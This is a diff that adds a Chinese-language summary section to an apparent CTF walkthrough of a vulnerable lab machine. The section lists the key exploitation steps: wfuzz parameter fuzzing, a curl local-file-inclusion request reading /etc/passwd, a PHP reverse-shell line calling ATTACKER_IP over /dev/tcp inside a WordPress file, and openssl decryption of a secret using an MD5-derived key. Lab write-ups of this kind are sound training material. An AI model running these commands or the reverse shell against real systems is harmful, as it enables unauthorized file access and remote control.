@@ -450,3 +450,46 @@ sudo /home/victor/undefeated_victor
 ![25.png](25.png)
 
 至此已经拿下了 flag 。
+
+### 关键操作与注意事项
+  
+1. WFuzz 参数爆破:
+
+```bash
+wfuzz -c -w common.txt --hh 136 "http://192.168.170.139/index.php?FUZZ=../../etc/passwd"  
+```
+
++ --hh 136：过滤固定响应长度，排除干扰项
++ 注意：若响应始终为 200，需结合内容长度/关键词过滤
+
+2. 文件包含漏洞利用
+
+```bash
+curl "http://192.168.170.139/image.php?secrettier360=../../../../etc/passwd"  
+```
+
+3. 权限提升:通过**凭证复用**或**内核漏洞**双路径提权，优先选择低噪声方式。
+
+>   3.1 WordPress 后台突破
+>   -   在 `secret.php` 插入 PHP 反弹 Shell：
+>   ```php
+>   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'"); ?>  
+>   ```
+>   -   权限陷阱：上传主题/插件可能受目录写权限限制，优先查找可编辑文件。
+>
+>   3.2 OpenSSL 密钥破解（重点注意 `-n` 参数）
+>   
+>   -   生成密钥时 必须使用 `-n` 避免**换行符污染**：
+>
+>   ```bash
+>   echo -n 'ippsec' | md5sum | awk '{print $1}'  
+>   ```
+>   -   数据处理链：
+>
+>   ```bash
+>   echo -n '密文' | openssl enc -d -a -aes-256-ecb -K $(echo -n 'ippsec' | md5sum | awk '{print $1}')  
+>   ```
+>
+>   -   验证:
+>       -   检查原始数据是否含换行符（od -c 查看）
+>       -   确认加密算法与模式（此处为 aes-256-ecb）       
